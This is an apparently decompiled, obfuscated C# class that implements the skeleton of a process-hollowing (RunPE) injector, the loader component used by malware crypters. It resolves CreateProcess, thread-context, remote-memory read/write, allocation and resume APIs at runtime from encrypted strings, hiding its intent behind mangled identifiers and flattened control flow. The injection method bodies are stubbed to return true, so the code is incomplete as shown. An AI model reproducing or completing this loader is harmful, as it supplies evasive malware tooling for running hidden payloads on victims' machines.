using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using yleKZlCXnrEgcQD3gk;

public class Óµ
{
	public delegate bool Äñê(string àÿš, string çšÿ, IntPtr öƒýœ, IntPtr ûýùù, bool ñþ, uint Ωó, IntPtr environment, string currentDirectory, ref ÖÖÖÖÖÖ startupInfo, ref ÄÄÄÄÄÄ processInformation);

	public delegate bool ÑÖÎ(IntPtr thread, int[] context);

	public delegate bool ÛàÝ(IntPtr thread, int[] context);

	public delegate bool ÖÖÖÖ(IntPtr thread, int[] context);

	public delegate bool Wow64ÖÖÖÖ(IntPtr thread, int[] context);

	public delegate bool ÊÅÃ(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

	public delegate bool Ðîò(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

	public delegate int Ôñç(IntPtr process, int baseAddress);

	public delegate int ËÙąúö(IntPtr handle, int address, int length, int type, int protect);

	public delegate int Ñðìĉŏ(IntPtr handle);

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct ÄÄÄÄÄÄ
	{
		public IntPtr ProcessHandle;

		public IntPtr ThreadHandle;

		public uint ProcessId;

		public uint ThreadId;

		static ÄÄÄÄÄÄ()
		{
			HIqNmi47ta6wQLwpfy.Rb22303oj();
		}
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct ÖÖÖÖÖÖ
	{
		public uint Size;

		public string Reserved1;

		public string Desktop;

		public string Title;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
		public byte[] Misc;

		public IntPtr Reserved2;

		public IntPtr StdInput;

		public IntPtr StdOutput;

		public IntPtr StdError;

		static ÖÖÖÖÖÖ()
		{
			HIqNmi47ta6wQLwpfy.Rb22303oj();
		}
	}

	private Dynamic Dynamic;

	private static readonly Äñê ñÛÖ;

	private static readonly ÑÖÎ ÜÓû;

	private static readonly ÛàÝ Žÿûƒ;

	private static readonly ÖÖÖÖ ÒÒÒÒÒ;

	private static readonly Wow64ÖÖÖÖ þþþþþþ;

	private static readonly ÊÅÃ ÚÖÕæä;

	private static readonly Ðîò ÊÈÚÙØ;

	private static readonly Ôñç Ñäæéêë;

	private static readonly ËÙąúö ÓÖÒÕÑ;

	private static readonly Ñðìĉŏ ÑÐÑÐÑ;

	[MethodImpl(MethodImplOptions.NoInlining)]
	static Óµ()
	{
		//Discarded unreachable code: IL_010a
		HIqNmi47ta6wQLwpfy.Rb22303oj();
		int num = 1;
		while (true)
		{
			int num2 = num;
			while (true)
			{
				int num3 = num2;
				while (true)
				{
					switch (num3)
					{
					case 11:
						ÒÒÒÒÒ = Dynamic.CreateApi<ÖÖÖÖ>(HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(240), Encryption.DecryptText(HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(260), HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(248)));
						num2 = 0;
						if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
						{
							break;
						}
						goto case 9;
					case 9:
						ÊÈÚÙØ = Dynamic.CreateApi<Ðîò>(HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(240), Encryption.DecryptText(HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(272), HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(248)));
						num2 = 5;
						break;
					case 12:
						return;
					case 0:
						þþþþþþ = Dynamic.CreateApi<Wow64ÖÖÖÖ>(HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(240), Encryption.DecryptText(HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(264), HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(248)));
						goto case 6;
					default:
						num2 = 6;
						if (0 == 0)
						{
							break;
						}
						goto case 5;
					case 5:
						Ñäæéêë = Dynamic.CreateApi<Ôñç>(HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(276), Encryption.DecryptText(HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(280), HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(248)));
						num3 = 8;
						continue;
					case 6:
						ÚÖÕæä = Dynamic.CreateApi<ÊÅÃ>(HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(240), Encryption.DecryptText(HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(268), HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(248)));
						num2 = 9;
						if (true)
						{
							break;
						}
						goto case 8;
					case 8:
						ÓÖÒÕÑ = Dynamic.CreateApi<ËÙąúö>(HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(240), Encryption.DecryptText(HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(284), HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(248)));
						goto case 7;
					case 1:
						if (!HIqNmi47ta6wQLwpfy.v9koUX6Y0(32))
						{
							ñÛÖ = Dynamic.CreateApi<Äñê>(HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(240), Encryption.DecryptText(HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(244), HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(248)));
							_ = 1;
							if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
							{
								num2 = 4;
								if (true)
								{
									break;
								}
								goto case 0;
							}
							num2 = 7;
							break;
						}
						num2 = 12;
						if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
						{
							break;
						}
						goto case 7;
					case 7:
					case 10:
						ÑÐÑÐÑ = Dynamic.CreateApi<Ñðìĉŏ>(HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(240), Encryption.DecryptText(HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(288), HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(248)));
						num3 = 13;
						continue;
					case 2:
					case 4:
						ÜÓû = Dynamic.CreateApi<ÑÖÎ>(HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(240), Encryption.DecryptText(HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(252), HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(248)));
						num2 = 3;
						if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
						{
							break;
						}
						goto end_IL_0113;
					case 3:
						goto end_IL_0113;
					case 13:
						return;
					}
					break;
				}
				continue;
				end_IL_0113:
				break;
			}
			Žÿûƒ = Dynamic.CreateApi<ÛàÝ>(HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(240), Encryption.DecryptText(HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(256), HIqNmi47ta6wQLwpfy.uv2Aqh0Fu(248)));
			num = 11;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public Óµ()
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static bool ØØØØ(string path, string cmd, byte[] data, bool compatible)
	{
		return true;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static bool ÑÑÑÑÑÑ(string path, string cmd, byte[] data, bool compatible)
	{
		return true;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool _0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()
	{
		return true;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool _008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091()
	{
		return true;
	}
}
